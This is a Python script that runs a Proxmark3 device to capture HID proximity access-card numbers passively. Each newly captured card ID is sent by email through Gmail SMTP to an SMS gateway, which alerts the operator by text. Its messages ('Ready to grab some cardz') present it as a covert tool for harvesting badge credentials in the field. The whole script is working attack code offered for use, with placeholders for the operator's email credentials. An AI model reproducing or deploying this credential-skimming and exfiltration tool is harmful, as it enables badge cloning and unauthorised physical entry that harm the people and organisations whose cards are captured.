#!/usr/bin/env python

from __future__ import absolute_import
from __future__ import print_function
from email import utils
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

try: import pexpect
except: print("Pexpect needs to be installed. Try 'pip install pexpect'")
import sys
import time
import smtplib
import argparse

# CHANGE THE FOLLOWING VARIABLES
###################################
emailFrom = "<Gmail email address here>"
textTo = ["<10-digit-number>@vtext.com"] # verizon, you may also add more than 1
#textTo = ["<10-digit-number>@txt.att.net"] # AT&T
# Reference here for more - https://avtech.com/articles/138/list-of-email-to-sms-addresses/
gmailPass = "<Gmail password here"

###################################
# Do not change anything below unless using something other than Gmail or you know what you're doing :)

def emailMe(captured_card):
    fromaddr = emailFrom
    toaddr = textTo
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = ", ".join(toaddr)
    msg['Subject'] = "New Captured RFID Card!"

    body = "RFID card number - " + captured_card
    msg.attach(MIMEText(body, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, gmailPass)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

def emailMeFirstStart():
    fromaddr = emailFrom
    toaddr = textTo
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = ", ".join(toaddr)

    body = "[Success] Proxmark3 running successfully. Ready to grab some cardz. Go get 'em!"
    msg.attach(MIMEText(body, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, gmailPass)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

def emailMeError():
    fromaddr = emailFrom
    toaddr = textTo
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = ", ".join(toaddr)

    body = "[Error] Proxmark3 is no longer capturing, application exit"
    msg.attach(MIMEText(body, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, gmailPass)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

def emailMeEnd():
    fromaddr = emailFrom
    toaddr = textTo
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = ", ".join(toaddr)

    body = "[Done] Proxmark3 is no longer capturing but did not error out"
    msg.attach(MIMEText(body, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, gmailPass)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

def execute(location):
    usb = location

    # Spawn a child and execute the Proxmark application with the correct USB flag
    command = 'proxmark3 {0}'.format(usb)
    child = pexpect.spawn(command, timeout=30000)

    # Wait for the client to start up
    time.sleep(10)

    # Send the application a command to start listening for any cards
    child.sendline('lf hid watch')
    emailMeFirstStart()

    # Log file creation
    fout = open("LOG.TXT","wb")
    child.logfile_read = fout # use child.logfile to also log writes

    child.logfile = sys.stdout
    cards = []
    counter = 0

    while True:
        i = child.expect(["TAG ID", "Done", "cannot communicate with the Proxmark"])
        if i == 0:
            #print('Correct card submitted. Your unique PIN is 4538.')
            card_num = child.readline().split()[1]
            if '\x1b[32m' in card_num:
                clean_card = card_num.replace('\x1b[32m', '')
                if clean_card not in cards:
                    cards.append(clean_card)
                    emailMe(clean_card)
            elif '[32m' in card_num:
                clean_card = card_num.replace('[32m', '')
                if clean_card not in cards:
                    cards.append(clean_card)
                    emailMe(clean_card)
            else:
                if card_num not in cards:
                    cards.append(card_num)
                    emailMe(card_num)
        if i == 1:
            if counter == 0:
                child.sendline('lf hid watch')
                counter += 1
            else:
                # only redo this once so we're not stuck in a loop
                emailMeEnd()
                print("Second press of button, exiting")
                fout.close()
                exit()

        if i == 2:
            print("Unable to communicate with proxmark, exiting")
            emailMeError()
            fout.close()
            exit()

def main():
    parser = argparse.ArgumentParser(prog=sys.argv[0], description=' -l <Location of proxmark>')
    parser.add_argument('-l', '--location', required=True, dest='location', type=str, help='specify the location of the proxmark (ex: /dev/cu.usbmodemiceman1 or /dev/tty.PM3_RDV40-DevB')

    args = parser.parse_args()
    if not len(sys.argv) > 1:
        parser.print_help()
        exit()

    print('Time executed: {0}\n'.format(utils.formatdate(timeval=None, localtime=True, usegmt=False)))
    execute(args.location)

if __name__ == '__main__':
    main()
